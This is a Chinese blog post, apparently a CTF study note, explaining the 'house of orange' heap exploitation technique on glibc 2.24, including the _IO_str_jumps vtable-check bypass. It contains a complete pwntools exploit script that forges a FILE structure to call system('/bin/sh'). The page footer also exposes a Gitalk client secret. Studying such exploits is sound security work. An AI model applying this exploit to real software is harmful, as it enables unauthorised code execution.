<h3 id="house-of-orange在glibc2-24下的利用"><a href="#house-of-orange在glibc2-24下的利用" class="headerlink" title="house of orange在glibc2.24下的利用"></a>house of orange在glibc2.24下的利用</h3><p>glibc2.24开始引入vtable 的检测函数—— <code>IO_validate_vtable</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vtable需要满足的条件：</p>
<blockquote>
<p>在 <strong>stop_</strong>IO_vtables 和 <strong>start_</strong>libc_IO_vtables 之间</p>
</blockquote>
<p>而我们伪造的vtable通常不满足这个条件，但是可以找到 ==<strong>IO_str_jumps== 符合条件。（接下来就分析利用</strong>IO_str_jumps的绕过）</p>
<p>__IO_str_jumps 结构如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我们利用<code>_IO_str_finish</code>进行接下来的绕过和利用</p>
<p>其源码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void _IO_str_finish (FILE *fp, int dummy)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    // call qword ptr [fp+0E8h]</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); </span><br><span class="line">  fp-&gt;_IO_buf_base = NULL;</span><br><span class="line">  _IO_default_finish (fp, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以知道绕过的条件是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags= 0</span><br><span class="line">fp-&gt;_IO_buf_base = binsh_addr</span><br></pre></td></tr></table></figure>

<p>此时我们使vtable存放指向<code>_IO_str_jumps - 8</code>处的指针 ，这样调用<code>_IO_overflow</code>时会调用到<code>_IO_str_finish</code></p>
<p>不过，由于<code>_IO_str_jumps</code>不在符号表内，所以只能通过其他函数来间接得到它的地址，例如<code>_IO_str_underflow</code>，我们已知<font color="red">_IO_str_jumps 的地址大于_IO_file_jumps 地址</font>，可以用此来确认_IO_str_underflow的地址，并且<code>_IO_str_underflow</code>=<code>_IO_str_jummps+0x20</code></p>
<p>然后我在<a href="https://xz.aliyun.com/t/2411" target="_blank" rel="noopener">大佬的博客</a>里看到一个特别6的方法可以直接算出偏移（不用手算！）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IO_file_jumps_offset = libc.sym[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">IO_str_underflow_offset = libc.sym[<span class="string">'_IO_str_underflow'</span>]</span><br><span class="line"><span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        <span class="keyword">print</span> possible_IO_str_jumps_offset</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>因为满足了if之后，会<code>call qword ptr [fp+0E8h]</code></p>
<p>所以我们使</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp+0xe8 = system_addr</span><br></pre></td></tr></table></figure>

<p>就可以实现getshell了</p>
<p>这个方法在glibc 2.23和glibc 2.24里都适用</p>
<p>所以我们用上面那题来试一下这个方法，运用了大佬微博里自定义的的封装函数，构造我们的exp，然后就发现我们getshell成功了</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import*</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p = process(&apos;./houseoforange&apos;)</span><br><span class="line">elf = ELF(&apos;./houseoforange&apos;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">def add(size,name,price,color):</span><br><span class="line">	p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">	p.sendline(&quot;1&quot;)</span><br><span class="line">	p.recvuntil(&quot;name :&quot;)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(&quot;Name :&quot;)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(&quot;Orange:&quot;)</span><br><span class="line">	p.sendline(str(price))</span><br><span class="line">	p.recvuntil(&quot;Orange:&quot;)</span><br><span class="line">	p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upgrade(size,name,price,color):</span><br><span class="line">	p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">	p.sendline(&quot;3&quot;)</span><br><span class="line">	p.recvuntil(&quot;name :&quot;)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(&quot;Name:&quot;)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(&quot;Orange:&quot;)</span><br><span class="line">	p.sendline(str(price))</span><br><span class="line">	p.recvuntil(&quot;Orange:&quot;)</span><br><span class="line">	p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def see():</span><br><span class="line">	p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">	p.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pack_file(_flags = 0,</span><br><span class="line">              _IO_read_ptr = 0,</span><br><span class="line">              _IO_read_end = 0,</span><br><span class="line">              _IO_read_base = 0,</span><br><span class="line">              _IO_write_base = 0,</span><br><span class="line">              _IO_write_ptr = 0,</span><br><span class="line">              _IO_write_end = 0,</span><br><span class="line">              _IO_buf_base = 0,</span><br><span class="line">              _IO_buf_end = 0,</span><br><span class="line">              _IO_save_base = 0,</span><br><span class="line">              _IO_backup_base = 0,</span><br><span class="line">              _IO_save_end = 0,</span><br><span class="line">              _IO_marker = 0,</span><br><span class="line">              _IO_chain = 0,</span><br><span class="line">              _fileno = 0,</span><br><span class="line">              _lock = 0,</span><br><span class="line">              _wide_data = 0,</span><br><span class="line">              _mode = 0):</span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">             p32(0) + \</span><br><span class="line">             p64(_IO_read_ptr) + \</span><br><span class="line">             p64(_IO_read_end) + \</span><br><span class="line">             p64(_IO_read_base) + \</span><br><span class="line">             p64(_IO_write_base) + \</span><br><span class="line">             p64(_IO_write_ptr) + \</span><br><span class="line">             p64(_IO_write_end) + \</span><br><span class="line">             p64(_IO_buf_base) + \</span><br><span class="line">             p64(_IO_buf_end) + \</span><br><span class="line">             p64(_IO_save_base) + \</span><br><span class="line">             p64(_IO_backup_base) + \</span><br><span class="line">             p64(_IO_save_end) + \</span><br><span class="line">             p64(_IO_marker) + \</span><br><span class="line">             p64(_IO_chain) + \</span><br><span class="line">             p32(_fileno)</span><br><span class="line">    file_struct = file_struct.ljust(0x88, &quot;\x00&quot;)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(0xa0, &quot;\x00&quot;)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(0xc0, &apos;\x00&apos;)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(0xd8, &quot;\x00&quot;)</span><br><span class="line">    return file_struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr):</span><br><span class="line">    payload = pack_file(_flags = 0,</span><br><span class="line">                        _IO_read_ptr = 0x61, #smallbin4file_size</span><br><span class="line">                        _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr,</span><br><span class="line">                        _IO_write_base = 0,</span><br><span class="line">                        _IO_write_ptr = 1,</span><br><span class="line">                        _IO_buf_base = binsh_addr,</span><br><span class="line">                        _mode = 0,</span><br><span class="line">                        )</span><br><span class="line">    payload += p64(_IO_str_jumps_addr-8)</span><br><span class="line">    payload += p64(0) # paddding</span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line">add(0x10,&apos;aaaa&apos;,32,1)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">upgrade(0x40,&apos;a&apos;*0x10+p64(0)+p64(0x21)+&apos;a&apos;*0x10+p64(0)+p64(0xfa1),32,1)</span><br><span class="line"></span><br><span class="line">add(0xfb0,&apos;aaaa&apos;,32,1) #in unsorted bin list</span><br><span class="line"></span><br><span class="line">add(0x400,&apos;b&apos;*8,32,1)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">see()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;b&apos;*8)</span><br><span class="line">main_arena = u64(p.recv(6).ljust(8,&apos;\x00&apos;)) - 1640</span><br><span class="line"></span><br><span class="line">print hex(main_arena)</span><br><span class="line">libc_base = main_arena - 0x3c4b20</span><br><span class="line">print hex(libc_base)</span><br><span class="line"></span><br><span class="line">upgrade(0x400,&apos;b&apos;*0x10,32,1)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(&apos;b&apos;*0x10)</span><br><span class="line">heap_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(heap_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_IO_list_all = libc.symbols[&apos;_IO_list_all&apos;] + libc_base</span><br><span class="line">system = libc.symbols[&apos;system&apos;] + libc_base</span><br><span class="line">binsh_addr = next(libc.search(&quot;/bin/sh&quot;)) + libc_base</span><br><span class="line">IO_file_jumps_offset = libc.sym[&apos;_IO_file_jumps&apos;]</span><br><span class="line">IO_str_underflow_offset = libc.sym[&apos;_IO_str_underflow&apos;]</span><br><span class="line">for ref_offset in libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - 0x20</span><br><span class="line">    if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        print possible_IO_str_jumps_offset</span><br><span class="line">        break</span><br><span class="line">        </span><br><span class="line">_IO_str_jumps_addr=libc_base + possible_IO_str_jumps_offset</span><br><span class="line">print hex(_IO_str_jumps_addr)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x400+p64(0)+p64(0x21)+p32(666)+p32(0xddaa)+p64(0)</span><br><span class="line">file = pack_file_flush_str_jumps(_IO_str_jumps_addr,_IO_list_all,system,binsh_addr)</span><br><span class="line">pay+=file</span><br><span class="line">upgrade(0x800,pay,32,2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>　　</p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://www.anquanke.com/post/id/85127" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85127</a><br><a href="https://bbs.pediy.com/thread-251195.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251195.htm</a><br><a href="https://www.cnblogs.com/shangye/p/6268981.html" target="_blank" rel="noopener">https://www.cnblogs.com/shangye/p/6268981.html</a><br><a href="https://www.jianshu.com/p/4b0a73f321f9" target="_blank" rel="noopener">https://www.jianshu.com/p/4b0a73f321f9</a><br><a href="https://xz.aliyun.com/t/2411" target="_blank" rel="noopener">https://xz.aliyun.com/t/2411</a></p>
<p>　　</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://c0yo7e.github.io/2020/03/10/house-of-orange/" data-id="ckdcs40ig000cfoswbiyel1zl"
         class="article-share-link">Share</a>
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn知识点/">pwn知识点</a></li></ul>

    </footer>

  </div>

  
    
  <nav class="article-nav">
    
      <a href="/2020/05/12/mips编译环境配置与简单栈溢出/" class="article-nav-link">
        <strong class="article-nav-caption">Newer posts</strong>
        <div class="article-nav-title">
          
            mips编译环境配置与简单栈溢出
          
        </div>
      </a>
    
    
      <a href="/2020/02/18/unlink/" class="article-nav-link">
        <strong class="article-nav-caption">Olde posts</strong>
        <div class="article-nav-title">unlink</div>
      </a>
    
  </nav>


  

  
    
  <div class="gitalk" id="gitalk-container"></div>
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
  <script type="text/javascript">
    var gitalk = new Gitalk({
      clientID: '57453e2505e1523b1d78',
      clientSecret: 'c9d2109f4649be7dca5ef5622d85e38608a7cd1e',
      repo: 'content',
      owner: 'C0yo7e',
      admin: ['C0yo7e'],
      // id: location.pathname,      // Ensure uniqueness and length less than 50
      id: md5(location.pathname),
      distractionFreeMode: false,  // Facebook-like distraction free mode
      pagerDirection: 'last'
    })

  gitalk.render('gitalk-container')
  </script>

  

</article>



</section>
  <footer class="footer">
  <div class="outer">
    <div class="float-right">
      <ul class="list-inline">
  
    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
  
</ul>
    </div>
    <ul class="list-inline">
      <li>&copy; 2020 The lair of C0yo7e</li>
      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
    </ul>
  </div>
</footer>

</main>

<aside class="sidebar sidebar-specter">
  
    <button class="navbar-toggle"></button>
<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/time.png" alt="The lair of C0yo7e"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/about">About</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="搜索">
        <i class="fe fe-search"></i>
        Search
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
          <i class="fe fe-feed"></i>
        </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
  </aside>
  <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/lazyload.min.js"></script>
<script src="/js/busuanzi-2.3.pure.min.js"></script>

  <script src="/fancybox/jquery.fancybox.min.js"></script>



  <script src="/js/tocbot.min.js"></script>
  <script>
    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
    tocbot.init({
      tocSelector: '.tocbot',
      contentSelector: '.article-entry',
      headingSelector: 'h1, h2, h3, h4, h5, h6',
      hasInnerContainers: true,
      scrollSmooth: true,
      positionFixedSelector: '.tocbot',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
    });
  </script>


<script src="/js/ocean.js"></script>

</body>
</html>